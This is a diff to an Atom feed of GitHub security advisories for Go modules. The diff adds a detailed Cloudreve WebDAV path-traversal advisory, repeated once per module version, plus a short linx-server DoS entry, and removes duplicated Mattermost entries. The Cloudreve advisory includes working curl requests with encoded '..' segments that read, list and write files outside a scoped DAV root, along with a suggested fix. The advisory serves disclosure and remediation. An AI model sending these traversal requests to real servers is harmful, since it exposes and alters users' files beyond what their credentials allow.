@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-08-26T14:33:15.477Z</updated>
+    <updated>2026-08-26T16:08:17.697Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,271 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cloudreve/Cloudreve/v3] Cloudreve WebDAV (`/dav`) has Path Traversal / Broken Access Control — scoped DAV credential escapes its configured account root]]></title>
+        <id>https://github.com/advisories/GHSA-w5fv-7x5q-g8qp</id>
+        <link href="https://github.com/advisories/GHSA-w5fv-7x5q-g8qp"/>
+        <updated>2026-08-26T15:22:14.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A Cloudreve WebDAV account stores a <code>uri</code> that defines the account's root folder. The WebDAV request handler (<code>stripPrefix</code> in <code>pkg/webdav/webdav.go</code>) trims the <code>/dav</code> prefix from the request path and joins the remainder to that root with <code>fs.URI.JoinRaw</code>, but never checks that the joined URI stays inside the root.</p>
+<p>Go's <code>net/http</code> decodes <code>%2e%2e</code> to <code>..</code> and <code>%2f</code> to <code>/</code> in <code>r.URL.Path</code> before the handler sees it, and <code>JoinRaw</code> resolves <code>..</code> segments through the standard library's <code>url.URL.JoinPath</code>. A request such as <code>GET /dav/%2e%2e/outside.txt</code> against a credential rooted at <code>cloudreve://my/restricted</code> therefore resolves to <code>cloudreve://my/outside.txt</code>. A scoped DAV credential can read and list files outside its configured folder; a writable scoped credential can also create, overwrite, move, and delete them.</p>
+<p>The escape stays inside the same Cloudreve user's namespace because downstream DBFS owner checks still apply. It does not cross into another user's files or onto the OS filesystem. What it breaks is the per-folder WebDAV-account boundary — the entire reason scoped DAV accounts exist (delegating limited access to a sync client or a third party).</p>
+<h2 id="technical-detail">Technical Detail</h2>
+<h3 id="root-cause">Root cause</h3>
+<p><code>stripPrefix</code> joins the request suffix onto the account base with no containment check:</p>
+<pre><code class="language-go">// pkg/webdav/webdav.go @ 54dc81d
+func stripPrefix(p string, u *ent.User) (string, *fs.URI, int, error) {
+    base, err := fs.NewUriFromString(u.Edges.DavAccounts[0].URI)
+    if err != nil {
+        return "", nil, http.StatusInternalServerError, err
+    }
+
+    prefix := davPrefix // "/dav"
+    if r := strings.TrimPrefix(p, prefix); len(r) &lt; len(p) {
+        r = strings.TrimPrefix(r, fs.Separator)
+        return r, base.JoinRaw(util.RemoveSlash(r)), http.StatusOK, nil // &lt;-- join, no boundary check
+    }
+    return "", nil, http.StatusNotFound, errPrefixMismatch
+}
+</code></pre>
+<p><code>JoinRaw</code> splits on <code>/</code> and delegates to the standard library:</p>
+<pre><code class="language-go">// pkg/filemanager/fs/uri.go @ 54dc81d
+func (u *URI) JoinRaw(elem string) *URI {
+    return u.Join(strings.Split(strings.TrimPrefix(elem, Separator), Separator)...)
+}
+
+func (u *URI) Join(elem ...string) *URI {
+    newUrl, _ := url.Parse(u.U.String())
+    return &amp;URI{U: newUrl.JoinPath(lo.Map(elem, func(s string, i int) string {
+        return PathEscape(s)
+    })...)}
+}
+</code></pre>
+<p><code>PathEscape</code> leaves a <code>.</code> untouched (<code>shouldEscape</code> returns <code>false</code> for <code>.</code>), so the literal segment <code>..</code> survives into <code>url.URL.JoinPath</code>, which cleans the path and resolves the parent reference.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>The full server was not run from the checkout (the embedded frontend asset <code>assets.zip</code> is absent from source), so the chain was proven by exercising the two decisive layers with real code rather than a screenshot of a live instance.</p>
+<h3 id="layer-1--nethttp-hands-the-handler-a-decoded-uncleaned-path">Layer 1 — <code>net/http</code> hands the handler a decoded, <em>uncleaned</em> path</h3>
+<p>A standard-library HTTP server, hit over a real socket with raw request targets (equivalent to <code>curl --path-as-is</code>), shows what <code>c.Request.URL.Path</code> holds inside the handler:</p>
+<pre><code>REQUEST: GET /dav/%2e%2e/outside.txt
+  handler observed: URL.Path="/dav/../outside.txt"   RawPath="/dav/%2e%2e/outside.txt"   -&gt; 200
+REQUEST: PROPFIND /dav/%2e%2e/
+  handler observed: URL.Path="/dav/../"              RawPath="/dav/%2e%2e/"               -&gt; 200
+REQUEST: PUT /dav/%2e%2e/created-outside.txt
+  handler observed: URL.Path="/dav/../created-outside.txt"                                 -&gt; 200
+REQUEST: GET /dav/%2F..%2Foutside.txt
+  handler observed: URL.Path="/dav//../outside.txt"  RawPath="/dav/%2F..%2Foutside.txt"   -&gt; 200
+</code></pre>
+<p>The path is decoded but never cleaned. Gin does not rewrite <code>Request.URL.Path</code>, so the Cloudreve handler observes the same value.</p>
+<h3 id="layer-2--cloudreves-uri-resolution-escapes-the-root">Layer 2 — Cloudreve's URI resolution escapes the root</h3>
+<p>Re-running Cloudreve's exact <code>PathEscape</code> / <code>shouldEscape</code> / <code>Join</code> / <code>JoinRaw</code> / <code>NewUriFromString</code> code (copied verbatim from <code>uri.go @ 54dc81d</code>) against the real <code>net/url</code> library, with base <code>cloudreve://my/restricted</code>:</p>
+<pre><code>traversal %2e%2e        URL.Path=/dav/../outside.txt     suffix="../outside.txt"     =&gt; cloudreve://my/outside.txt
+traversal %2F..%2F      URL.Path=/dav//../outside.txt    suffix="/../outside.txt"    =&gt; cloudreve://my/outside.txt
+benign nested           URL.Path=/dav/sub/normal.txt     suffix="sub/normal.txt"     =&gt; cloudreve://my/restricted/sub/normal.txt
+double-encoded (ctrl)   URL.Path=/dav/%2e%2e/outside.txt suffix="%2e%2e/outside.txt" =&gt; cloudreve://my/restricted/%252e%252e/outside.txt
+deep traversal          URL.Path=/dav/../../etc.txt      suffix="../../etc.txt"      =&gt; cloudreve://my/etc.txt
+</code></pre>
+<p>The traversal variants land outside <code>restricted</code>; the benign path stays inside; the double-encoded negative control stays literal under the root; and deep traversal clamps at the <code>my</code> root (host stays <code>my</code>, confirming the same-owner ceiling).</p>
+<h3 id="live-request-shapes-against-a-deployed-instance">Live request shapes (against a deployed instance)</h3>
+<pre><code class="language-bash"># Read outside the DAV root (works for read-only credentials too)
+curl --path-as-is -i -u 'victim@example.com:DAV_PASSWORD' \
+  'https://cloudreve.example/dav/%2e%2e/outside.txt'
+
+# List outside the DAV root
+curl --path-as-is -i -X PROPFIND -H 'Depth: 1' \
+  -u 'victim@example.com:DAV_PASSWORD' \
+  'https://cloudreve.example/dav/%2e%2e/'
+
+# Write outside the DAV root (writable credentials)
+printf 'created outside DAV root\n' | curl --path-as-is -i -X PUT \
+  -u 'victim@example.com:DAV_PASSWORD' --data-binary @- \
+  'https://cloudreve.example/dav/%2e%2e/created-outside.txt'
+</code></pre>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Read-only scoped credential</strong>: read and list any file in the owner's namespace, outside the folder the credential was scoped to.</li>
+<li><strong>Writable scoped credential</strong>: additionally create, overwrite, move, and delete those files.</li>
+</ul>
+<p>In normal use a scoped DAV account is the mechanism for handing limited access to a sync client or an outside party. This bug means that limit is not enforced: the credential reaches the owner's whole <code>my</code> filesystem.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p><code>fs.URI</code> already ships the predicate needed (<code>EqualOrIsDescendantOf</code>), so the fix is small:</p>
+<pre><code class="language-diff">     prefix := davPrefix
+     if r := strings.TrimPrefix(p, prefix); len(r) &lt; len(p) {
+         r = strings.TrimPrefix(r, fs.Separator)
+-		return r, base.JoinRaw(util.RemoveSlash(r)), http.StatusOK, nil
++		candidate := base.JoinRaw(util.RemoveSlash(r))
++		if !candidate.EqualOrIsDescendantOf(base, "") {
++			return "", nil, http.StatusForbidden, errPrefixMismatch
++		}
++		return r, candidate, http.StatusOK, nil
+     }
+     return "", nil, http.StatusNotFound, errPrefixMismatch
+</code></pre>
+<p>Regression tests worth adding:</p>
+<ul>
+<li><code>/dav/%2e%2e/outside.txt</code> from base <code>cloudreve://my/restricted</code> → rejected</li>
+<li><code>/dav/%2F..%2Foutside.txt</code> from base <code>cloudreve://my/restricted</code> → rejected</li>
+<li><code>COPY</code>/<code>MOVE</code> with <code>Destination: https://host/dav/%2e%2e/outside.txt</code> → rejected</li>
+<li><code>/dav/sub/normal.txt</code> → still resolves under the account root</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cloudreve/cloudreve/security/advisories/GHSA-w5fv-7x5q-g8qp">https://github.com/cloudreve/cloudreve/security/advisories/GHSA-w5fv-7x5q-g8qp</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54563">https://nvd.nist.gov/vuln/detail/CVE-2026-54563</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/releases/tag/4.16.1">https://github.com/cloudreve/cloudreve/releases/tag/4.16.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-w5fv-7x5q-g8qp">https://github.com/advisories/GHSA-w5fv-7x5q-g8qp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w5fv-7x5q-g8qp</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-26T15:22:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cloudreve/Cloudreve/v4] Cloudreve WebDAV (`/dav`) has Path Traversal / Broken Access Control — scoped DAV credential escapes its configured account root]]></title>
+        <id>https://github.com/advisories/GHSA-w5fv-7x5q-g8qp</id>
+        <link href="https://github.com/advisories/GHSA-w5fv-7x5q-g8qp"/>
+        <updated>2026-08-26T15:22:14.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A Cloudreve WebDAV account stores a <code>uri</code> that defines the account's root folder. The WebDAV request handler (<code>stripPrefix</code> in <code>pkg/webdav/webdav.go</code>) trims the <code>/dav</code> prefix from the request path and joins the remainder to that root with <code>fs.URI.JoinRaw</code>, but never checks that the joined URI stays inside the root.</p>
+<p>Go's <code>net/http</code> decodes <code>%2e%2e</code> to <code>..</code> and <code>%2f</code> to <code>/</code> in <code>r.URL.Path</code> before the handler sees it, and <code>JoinRaw</code> resolves <code>..</code> segments through the standard library's <code>url.URL.JoinPath</code>. A request such as <code>GET /dav/%2e%2e/outside.txt</code> against a credential rooted at <code>cloudreve://my/restricted</code> therefore resolves to <code>cloudreve://my/outside.txt</code>. A scoped DAV credential can read and list files outside its configured folder; a writable scoped credential can also create, overwrite, move, and delete them.</p>
+<p>The escape stays inside the same Cloudreve user's namespace because downstream DBFS owner checks still apply. It does not cross into another user's files or onto the OS filesystem. What it breaks is the per-folder WebDAV-account boundary — the entire reason scoped DAV accounts exist (delegating limited access to a sync client or a third party).</p>
+<h2 id="technical-detail">Technical Detail</h2>
+<h3 id="root-cause">Root cause</h3>
+<p><code>stripPrefix</code> joins the request suffix onto the account base with no containment check:</p>
+<pre><code class="language-go">// pkg/webdav/webdav.go @ 54dc81d
+func stripPrefix(p string, u *ent.User) (string, *fs.URI, int, error) {
+    base, err := fs.NewUriFromString(u.Edges.DavAccounts[0].URI)
+    if err != nil {
+        return "", nil, http.StatusInternalServerError, err
+    }
+
+    prefix := davPrefix // "/dav"
+    if r := strings.TrimPrefix(p, prefix); len(r) &lt; len(p) {
+        r = strings.TrimPrefix(r, fs.Separator)
+        return r, base.JoinRaw(util.RemoveSlash(r)), http.StatusOK, nil // &lt;-- join, no boundary check
+    }
+    return "", nil, http.StatusNotFound, errPrefixMismatch
+}
+</code></pre>
+<p><code>JoinRaw</code> splits on <code>/</code> and delegates to the standard library:</p>
+<pre><code class="language-go">// pkg/filemanager/fs/uri.go @ 54dc81d
+func (u *URI) JoinRaw(elem string) *URI {
+    return u.Join(strings.Split(strings.TrimPrefix(elem, Separator), Separator)...)
+}
+
+func (u *URI) Join(elem ...string) *URI {
+    newUrl, _ := url.Parse(u.U.String())
+    return &amp;URI{U: newUrl.JoinPath(lo.Map(elem, func(s string, i int) string {
+        return PathEscape(s)
+    })...)}
+}
+</code></pre>
+<p><code>PathEscape</code> leaves a <code>.</code> untouched (<code>shouldEscape</code> returns <code>false</code> for <code>.</code>), so the literal segment <code>..</code> survives into <code>url.URL.JoinPath</code>, which cleans the path and resolves the parent reference.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>The full server was not run from the checkout (the embedded frontend asset <code>assets.zip</code> is absent from source), so the chain was proven by exercising the two decisive layers with real code rather than a screenshot of a live instance.</p>
+<h3 id="layer-1--nethttp-hands-the-handler-a-decoded-uncleaned-path">Layer 1 — <code>net/http</code> hands the handler a decoded, <em>uncleaned</em> path</h3>
+<p>A standard-library HTTP server, hit over a real socket with raw request targets (equivalent to <code>curl --path-as-is</code>), shows what <code>c.Request.URL.Path</code> holds inside the handler:</p>
+<pre><code>REQUEST: GET /dav/%2e%2e/outside.txt
+  handler observed: URL.Path="/dav/../outside.txt"   RawPath="/dav/%2e%2e/outside.txt"   -&gt; 200
+REQUEST: PROPFIND /dav/%2e%2e/
+  handler observed: URL.Path="/dav/../"              RawPath="/dav/%2e%2e/"               -&gt; 200
+REQUEST: PUT /dav/%2e%2e/created-outside.txt
+  handler observed: URL.Path="/dav/../created-outside.txt"                                 -&gt; 200
+REQUEST: GET /dav/%2F..%2Foutside.txt
+  handler observed: URL.Path="/dav//../outside.txt"  RawPath="/dav/%2F..%2Foutside.txt"   -&gt; 200
+</code></pre>
+<p>The path is decoded but never cleaned. Gin does not rewrite <code>Request.URL.Path</code>, so the Cloudreve handler observes the same value.</p>
+<h3 id="layer-2--cloudreves-uri-resolution-escapes-the-root">Layer 2 — Cloudreve's URI resolution escapes the root</h3>
+<p>Re-running Cloudreve's exact <code>PathEscape</code> / <code>shouldEscape</code> / <code>Join</code> / <code>JoinRaw</code> / <code>NewUriFromString</code> code (copied verbatim from <code>uri.go @ 54dc81d</code>) against the real <code>net/url</code> library, with base <code>cloudreve://my/restricted</code>:</p>
+<pre><code>traversal %2e%2e        URL.Path=/dav/../outside.txt     suffix="../outside.txt"     =&gt; cloudreve://my/outside.txt
+traversal %2F..%2F      URL.Path=/dav//../outside.txt    suffix="/../outside.txt"    =&gt; cloudreve://my/outside.txt
+benign nested           URL.Path=/dav/sub/normal.txt     suffix="sub/normal.txt"     =&gt; cloudreve://my/restricted/sub/normal.txt
+double-encoded (ctrl)   URL.Path=/dav/%2e%2e/outside.txt suffix="%2e%2e/outside.txt" =&gt; cloudreve://my/restricted/%252e%252e/outside.txt
+deep traversal          URL.Path=/dav/../../etc.txt      suffix="../../etc.txt"      =&gt; cloudreve://my/etc.txt
+</code></pre>
+<p>The traversal variants land outside <code>restricted</code>; the benign path stays inside; the double-encoded negative control stays literal under the root; and deep traversal clamps at the <code>my</code> root (host stays <code>my</code>, confirming the same-owner ceiling).</p>
+<h3 id="live-request-shapes-against-a-deployed-instance">Live request shapes (against a deployed instance)</h3>
+<pre><code class="language-bash"># Read outside the DAV root (works for read-only credentials too)
+curl --path-as-is -i -u 'victim@example.com:DAV_PASSWORD' \
+  'https://cloudreve.example/dav/%2e%2e/outside.txt'
+
+# List outside the DAV root
+curl --path-as-is -i -X PROPFIND -H 'Depth: 1' \
+  -u 'victim@example.com:DAV_PASSWORD' \
+  'https://cloudreve.example/dav/%2e%2e/'
+
+# Write outside the DAV root (writable credentials)
+printf 'created outside DAV root\n' | curl --path-as-is -i -X PUT \
+  -u 'victim@example.com:DAV_PASSWORD' --data-binary @- \
+  'https://cloudreve.example/dav/%2e%2e/created-outside.txt'
+</code></pre>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Read-only scoped credential</strong>: read and list any file in the owner's namespace, outside the folder the credential was scoped to.</li>
+<li><strong>Writable scoped credential</strong>: additionally create, overwrite, move, and delete those files.</li>
+</ul>
+<p>In normal use a scoped DAV account is the mechanism for handing limited access to a sync client or an outside party. This bug means that limit is not enforced: the credential reaches the owner's whole <code>my</code> filesystem.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p><code>fs.URI</code> already ships the predicate needed (<code>EqualOrIsDescendantOf</code>), so the fix is small:</p>
+<pre><code class="language-diff">     prefix := davPrefix
+     if r := strings.TrimPrefix(p, prefix); len(r) &lt; len(p) {
+         r = strings.TrimPrefix(r, fs.Separator)
+-		return r, base.JoinRaw(util.RemoveSlash(r)), http.StatusOK, nil
++		candidate := base.JoinRaw(util.RemoveSlash(r))
++		if !candidate.EqualOrIsDescendantOf(base, "") {
++			return "", nil, http.StatusForbidden, errPrefixMismatch
++		}
++		return r, candidate, http.StatusOK, nil
+     }
+     return "", nil, http.StatusNotFound, errPrefixMismatch
+</code></pre>
+<p>Regression tests worth adding:</p>
+<ul>
+<li><code>/dav/%2e%2e/outside.txt</code> from base <code>cloudreve://my/restricted</code> → rejected</li>
+<li><code>/dav/%2F..%2Foutside.txt</code> from base <code>cloudreve://my/restricted</code> → rejected</li>
+<li><code>COPY</code>/<code>MOVE</code> with <code>Destination: https://host/dav/%2e%2e/outside.txt</code> → rejected</li>
+<li><code>/dav/sub/normal.txt</code> → still resolves under the account root</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cloudreve/cloudreve/security/advisories/GHSA-w5fv-7x5q-g8qp">https://github.com/cloudreve/cloudreve/security/advisories/GHSA-w5fv-7x5q-g8qp</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54563">https://nvd.nist.gov/vuln/detail/CVE-2026-54563</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/releases/tag/4.16.1">https://github.com/cloudreve/cloudreve/releases/tag/4.16.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-w5fv-7x5q-g8qp">https://github.com/advisories/GHSA-w5fv-7x5q-g8qp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w5fv-7x5q-g8qp</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-26T15:22:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/andreimarcu/linx-server] linx-server has an issue in the uploadPostHandler component that allows attackers to cause a Denial of Service (DoS) via a crafted POST request]]></title>
+        <id>https://github.com/advisories/GHSA-g743-m6x3-v6wm</id>
+        <link href="https://github.com/advisories/GHSA-g743-m6x3-v6wm"/>
+        <updated>2026-08-26T15:03:08.000Z</updated>
+        <content type="html"><![CDATA[<p>An issue in the uploadPostHandler component of Andrei Marcu linx-server v2.3.8 allows attackers to cause a Denial of Service (DoS) via a crafted POST request.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50879">https://nvd.nist.gov/vuln/detail/CVE-2026-50879</a></li>
+<li><a href="https://gist.github.com/pyuysig/807d92e6d8e7648d140d004f3b54b08b">https://gist.github.com/pyuysig/807d92e6d8e7648d140d004f3b54b08b</a></li>
+<li><a href="https://github.com/advisories/GHSA-g743-m6x3-v6wm">https://github.com/advisories/GHSA-g743-m6x3-v6wm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g743-m6x3-v6wm</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-15T21:30:41.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/kyverno/kyverno] Kyverno's NamespacedGeneratingPolicy generator.apply() namespace argument unvalidated -- background controller creates RoleBindings in any namespace including kube-system]]></title>
         <id>https://github.com/advisories/GHSA-79gf-7frw-68m9</id>
@@ -2020,111 +2285,6 @@ Content-Type: application/json
     </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost doesn't sanitize the Remote Cluster API response on PATCH operations]]></title>
-        <id>https://github.com/advisories/GHSA-9p44-r552-4wp9</id>
-        <link href="https://github.com/advisories/GHSA-9p44-r552-4wp9"/>
-        <updated>2026-08-24T21:48:39.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 11.6.x &lt;= 11.6.1, 11.5.x &lt;= 11.5.4, 10.11.x &lt;= 10.11.15 fail to sanitize the Remote Cluster API response on PATCH operations, which allows authenticated users with the {{manage_secure_connections}} permission to obtain remote cluster authentication tokens via a PATCH request to the remote cluster endpoint. Mattermost Advisory ID: MMSA-2026-00662</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7184">https://nvd.nist.gov/vuln/detail/CVE-2026-7184</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36288">https://github.com/mattermost/mattermost/pull/36288</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36306">https://github.com/mattermost/mattermost/pull/36306</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36310">https://github.com/mattermost/mattermost/pull/36310</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36311">https://github.com/mattermost/mattermost/pull/36311</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36313">https://github.com/mattermost/mattermost/pull/36313</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/1a0643df00c1f51a3b7e919eec034eaf955f612f">https://github.com/mattermost/mattermost/commit/1a0643df00c1f51a3b7e919eec034eaf955f612f</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/6fd49f56b5920569218fd2fc76d8ae802942f274">https://github.com/mattermost/mattermost/commit/6fd49f56b5920569218fd2fc76d8ae802942f274</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/bd8fc92226726da06c8fabaef568cc9ebaee1cb8">https://github.com/mattermost/mattermost/commit/bd8fc92226726da06c8fabaef568cc9ebaee1cb8</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/c5e67e28271c23cb585fe1a30ae81defcde848d6">https://github.com/mattermost/mattermost/commit/c5e67e28271c23cb585fe1a30ae81defcde848d6</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/cad3e8e51a4d8627af6442f9df8ae3667fac7fc1">https://github.com/mattermost/mattermost/commit/cad3e8e51a4d8627af6442f9df8ae3667fac7fc1</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v10.11.16">https://github.com/mattermost/mattermost/releases/tag/v10.11.16</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.5.5">https://github.com/mattermost/mattermost/releases/tag/v11.5.5</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.6.2">https://github.com/mattermost/mattermost/releases/tag/v11.6.2</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.7.0">https://github.com/mattermost/mattermost/releases/tag/v11.7.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-9p44-r552-4wp9">https://github.com/advisories/GHSA-9p44-r552-4wp9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9p44-r552-4wp9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-12T18:31:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost doesn't sanitize the Remote Cluster API response on PATCH operations]]></title>
-        <id>https://github.com/advisories/GHSA-9p44-r552-4wp9</id>
-        <link href="https://github.com/advisories/GHSA-9p44-r552-4wp9"/>
-        <updated>2026-08-24T21:48:39.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 11.6.x &lt;= 11.6.1, 11.5.x &lt;= 11.5.4, 10.11.x &lt;= 10.11.15 fail to sanitize the Remote Cluster API response on PATCH operations, which allows authenticated users with the {{manage_secure_connections}} permission to obtain remote cluster authentication tokens via a PATCH request to the remote cluster endpoint. Mattermost Advisory ID: MMSA-2026-00662</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7184">https://nvd.nist.gov/vuln/detail/CVE-2026-7184</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36288">https://github.com/mattermost/mattermost/pull/36288</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36306">https://github.com/mattermost/mattermost/pull/36306</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36310">https://github.com/mattermost/mattermost/pull/36310</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36311">https://github.com/mattermost/mattermost/pull/36311</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36313">https://github.com/mattermost/mattermost/pull/36313</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/1a0643df00c1f51a3b7e919eec034eaf955f612f">https://github.com/mattermost/mattermost/commit/1a0643df00c1f51a3b7e919eec034eaf955f612f</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/6fd49f56b5920569218fd2fc76d8ae802942f274">https://github.com/mattermost/mattermost/commit/6fd49f56b5920569218fd2fc76d8ae802942f274</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/bd8fc92226726da06c8fabaef568cc9ebaee1cb8">https://github.com/mattermost/mattermost/commit/bd8fc92226726da06c8fabaef568cc9ebaee1cb8</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/c5e67e28271c23cb585fe1a30ae81defcde848d6">https://github.com/mattermost/mattermost/commit/c5e67e28271c23cb585fe1a30ae81defcde848d6</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/cad3e8e51a4d8627af6442f9df8ae3667fac7fc1">https://github.com/mattermost/mattermost/commit/cad3e8e51a4d8627af6442f9df8ae3667fac7fc1</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v10.11.16">https://github.com/mattermost/mattermost/releases/tag/v10.11.16</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.5.5">https://github.com/mattermost/mattermost/releases/tag/v11.5.5</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.6.2">https://github.com/mattermost/mattermost/releases/tag/v11.6.2</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.7.0">https://github.com/mattermost/mattermost/releases/tag/v11.7.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-9p44-r552-4wp9">https://github.com/advisories/GHSA-9p44-r552-4wp9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9p44-r552-4wp9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-12T18:31:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost doesn't sanitize the Remote Cluster API response on PATCH operations]]></title>
-        <id>https://github.com/advisories/GHSA-9p44-r552-4wp9</id>
-        <link href="https://github.com/advisories/GHSA-9p44-r552-4wp9"/>
-        <updated>2026-08-24T21:48:39.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 11.6.x &lt;= 11.6.1, 11.5.x &lt;= 11.5.4, 10.11.x &lt;= 10.11.15 fail to sanitize the Remote Cluster API response on PATCH operations, which allows authenticated users with the {{manage_secure_connections}} permission to obtain remote cluster authentication tokens via a PATCH request to the remote cluster endpoint. Mattermost Advisory ID: MMSA-2026-00662</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7184">https://nvd.nist.gov/vuln/detail/CVE-2026-7184</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36288">https://github.com/mattermost/mattermost/pull/36288</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36306">https://github.com/mattermost/mattermost/pull/36306</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36310">https://github.com/mattermost/mattermost/pull/36310</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36311">https://github.com/mattermost/mattermost/pull/36311</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36313">https://github.com/mattermost/mattermost/pull/36313</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/1a0643df00c1f51a3b7e919eec034eaf955f612f">https://github.com/mattermost/mattermost/commit/1a0643df00c1f51a3b7e919eec034eaf955f612f</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/6fd49f56b5920569218fd2fc76d8ae802942f274">https://github.com/mattermost/mattermost/commit/6fd49f56b5920569218fd2fc76d8ae802942f274</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/bd8fc92226726da06c8fabaef568cc9ebaee1cb8">https://github.com/mattermost/mattermost/commit/bd8fc92226726da06c8fabaef568cc9ebaee1cb8</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/c5e67e28271c23cb585fe1a30ae81defcde848d6">https://github.com/mattermost/mattermost/commit/c5e67e28271c23cb585fe1a30ae81defcde848d6</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/cad3e8e51a4d8627af6442f9df8ae3667fac7fc1">https://github.com/mattermost/mattermost/commit/cad3e8e51a4d8627af6442f9df8ae3667fac7fc1</a></li>
